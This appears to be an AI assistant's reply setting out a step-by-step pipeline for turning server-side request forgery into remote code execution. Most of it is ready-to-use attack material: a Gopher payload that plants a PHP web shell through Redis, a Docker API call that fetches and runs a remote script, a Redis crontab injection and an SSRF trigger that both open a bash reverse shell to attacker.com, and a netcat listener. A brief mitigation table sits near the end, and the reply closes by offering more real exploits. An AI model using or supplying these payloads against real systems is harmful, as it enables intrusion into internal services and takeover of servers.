
Here’s a practical **SSRF to RCE exploitation pipeline**, which outlines how an attacker might escalate a **Server-Side Request Forgery (SSRF)** vulnerability into **Remote Code Execution (RCE)** on a server:

---

## 🔥 SSRF to RCE Exploitation Pipeline

### 🎯 **1. Identify SSRF**

Look for places where the application makes server-side HTTP requests:

- URL preview (e.g., fetching metadata)
- File import from URL
- PDF/image rendering from URL
- Webhooks, SSO (OAuth), etc.

**PoC**:

```bash
curl -X POST -d 'url=http://127.0.0.1:80' https://target.com/fetch
```

---

### 🧠 **2. Determine SSRF Capabilities**

Test for:

- DNS resolution (internal IPs, metadata URLs)
- Header injection
- HTTP method tampering (GET/POST)
- Port scanning

**Test internal services:**

```bash
http://169.254.169.254/latest/meta-data/  ← AWS EC2
http://127.0.0.1:3306                    ← MySQL
http://localhost:8000                    ← Dev services
```

---

### ⚙️ **3. Port Scan / Service Detection (Internal Recon)**

Use SSRF to map internal services:

```bash
http://localhost:2375/ ← Docker socket
http://localhost:8080/ ← Admin panel
http://localhost:9000/ ← MinIO, Jenkins
```

---

### 🐳 **4. Target Internal Services**

Examples:

- **Docker socket** SSRF → mount malicious image → container escape
- **Gogs/GitLab/Jenkins** SSRF → access admin panel → script execution
- **Redis**: SSRF to write cronjobs or SSH keys
- **Gopher Protocol**: SSRF → Redis/MySQL/Postgres to send raw payload

**Gopher payload for Redis to RCE:**

```
gopher://127.0.0.1:6379/_*3
$3
SET
$9
foo.php
$27
<?php system($_GET['cmd']); ?>
```

---

### ☢️ **5. Exploit SSRF to RCE via...**

#### 📌 Option A: Internal Admin Panels

- Jenkins Script Console → Groovy RCE
- GitLab API → CI pipelines → shell

#### 📌 Option B: Docker Socket (if exposed)

```bash
POST /containers/create?name=hacker
{
  "Image": "alpine",
  "Cmd": ["sh", "-c", "curl yourserver.com|sh"]
}
```

#### 📌 Option C: Redis RCE (via crontab)

```redis
SET 1 "\n* * * * * /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1\n"
CONFIG SET dir /var/spool/cron/crontabs/
CONFIG SET dbfilename root
SAVE
```

#### 📌 Option D: SSRF to Local File Write (LFI or writable file paths)

- Upload Web Shell
- Inject malicious config (e.g., PHP-FPM, .htaccess)

---

### 🧪 **6. Gain Command Execution**

- Upload Web Shell or trigger reverse shell
- Set up listener:

```bash
nc -lvnp 4444
```

- Use SSRF to trigger:

```bash
http://127.0.0.1/admin?cmd=bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

---

### 🛡️ Prevent SSRF to RCE

|Mitigation|Description|
|---|---|
|Input validation|Allow only whitelisted domains|
|No internal network access|Block `127.0.0.1`, `169.254.169.254`, etc|
|Metadata API restrictions|IAM roles & EC2 metadata v2|
|Docker hardening|Don’t expose Docker socket|
|Firewall rules|Prevent lateral/internal access from web apps|
|Logging|Detect outbound requests anomalies|

---

## 🧷 Summary Pipeline

```
[SSRF] → [Internal Recon] → [Service Access] → [Upload/Trigger Payload] → [RCE]
```

---

If you want I can give this as a PDF or provide real PoCs for Jenkins, Redis, Docker, or SSRF to Gopher attack. Let me know.